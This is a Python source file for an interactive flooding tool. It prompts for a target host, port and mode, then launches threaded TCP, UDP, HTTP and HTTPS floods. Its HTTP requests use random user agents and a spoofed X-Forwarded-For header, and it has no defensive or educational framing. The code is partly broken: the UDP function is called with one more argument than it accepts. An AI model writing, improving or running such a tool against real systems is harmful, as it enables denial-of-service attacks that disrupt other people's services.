import socket
import threading
import random
import ssl
import time
import logging
import json
from rich.console import Console
from rich.progress import Progress

# Initialize rich console for better visual output
console = Console()

# Set up logging
logging.basicConfig(filename="network_tool_log.txt", level=logging.INFO, format="%(asctime)s - %(message)s")

# Default configuration
CONFIG_FILE = "config.json"
default_config = {
    "default_timeout": 5,
    "default_threads": 10,
    "default_attack_type": "tcp",
    "log_successful_connections": True
}

# Load or create configuration
try:
    with open(CONFIG_FILE, "r") as file:
        config = json.load(file)
except FileNotFoundError:
    config = default_config
    with open(CONFIG_FILE, "w") as file:
        json.dump(default_config, file, indent=4)

# User agents for HTTP/HTTPS attacks
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-G998U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36"
]

# Generate a random IP address to spoof
def generate_random_ip():
    return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"

# Create random HTTP headers to send with the request
def create_fake_headers(host):
    user_agent = random.choice(user_agents)
    fake_ip = generate_random_ip()
    headers = (
        f"GET / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: {user_agent}\r\n"
        f"X-Forwarded-For: {fake_ip}\r\n"
        f"Connection: keep-alive\r\n\r\n"
    )
    return headers.encode('ascii')

# Attack functions
def tcp_flood(target_ip, target_port, timeout):
    try:
        with socket.create_connection((target_ip, target_port), timeout=timeout) as client:
            client.send(b"GET / HTTP/1.1\r\n")
        if config["log_successful_connections"]:
            logging.info(f"TCP Attack on {target_ip}:{target_port} successful")
    except Exception as e:
        logging.error(f"TCP Attack error: {e}")

def udp_flood(target_ip, target_port):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as client:
            message = random._urandom(1024)
            client.sendto(message, (target_ip, target_port))
            logging.info(f"UDP packet sent to {target_ip}:{target_port}")
    except Exception as e:
        logging.error(f"UDP Attack error: {e}")

def http_flood(target_ip, target_port, timeout):
    try:
        with socket.create_connection((target_ip, target_port), timeout=timeout) as client:
            headers = create_fake_headers(target_ip)
            client.send(headers)
        logging.info(f"HTTP request sent to {target_ip}:{target_port}")
    except Exception as e:
        logging.error(f"HTTP Attack error: {e}")

def https_flood(target_ip, target_port, timeout):
    try:
        context = ssl.create_default_context()
        with socket.create_connection((target_ip, target_port), timeout=timeout) as sock:
            with context.wrap_socket(sock, server_hostname=target_ip) as client:
                headers = create_fake_headers(target_ip)
                client.send(headers)
        logging.info(f"HTTPS request sent to {target_ip}:{target_port}")
    except Exception as e:
        logging.error(f"HTTPS Attack error: {e}")

# Thread worker function
def attack_worker(target_ip, target_port, attack_type, timeout):
    attack_funcs = {
        "tcp": tcp_flood,
        "udp": udp_flood,
        "http": http_flood,
        "https": https_flood
    }
    attack_func = attack_funcs.get(attack_type)
    if attack_func:
        attack_func(target_ip, target_port, timeout)

# Launch the attack
def launch_attack(target_ip, target_port, attack_type, num_threads, timeout):
    with Progress() as progress:
        task = progress.add_task(f"[green]Launching {attack_type.upper()} attack...", total=num_threads)
        threads = []
        for _ in range(num_threads):
            thread = threading.Thread(target=attack_worker, args=(target_ip, target_port, attack_type, timeout))
            threads.append(thread)
            thread.start()
            progress.advance(task)
        for thread in threads:
            thread.join()

# Resolve domain to IP
def resolve_domain(domain):
    try:
        ip = socket.gethostbyname(domain)
        console.print(f"[green]Resolved domain {domain} to IP {ip}[/green]")
        return ip
    except socket.error as e:
        console.print(f"[red]Failed to resolve domain: {e}[/red]")
        return None

# Interactive menu
def interactive_menu():
    console.print("[bold cyan]Enter target domain or IP:[/bold cyan]", end=" ")
    target_input = input().strip()
    
    if not target_input.replace(".", "").isdigit():
        target_ip = resolve_domain(target_input)
        if not target_ip:
            return
    else:
        target_ip = target_input

    console.print("[bold cyan]Enter target Port:[/bold cyan]", end=" ")
    target_port = int(input().strip())

    console.print("[bold cyan]Choose attack type (tcp, udp, http, https):[/bold cyan]", end=" ")
    attack_type = input().lower().strip()

    console.print("[bold cyan]Enter number of threads:[/bold cyan]", end=" ")
    num_threads = int(input().strip())

    console.print("[bold cyan]Enter request timeout (seconds):[/bold cyan]", end=" ")
    timeout = float(input().strip())

    launch_attack(target_ip, target_port, attack_type, num_threads, timeout)

# Run the tool
interactive_menu()
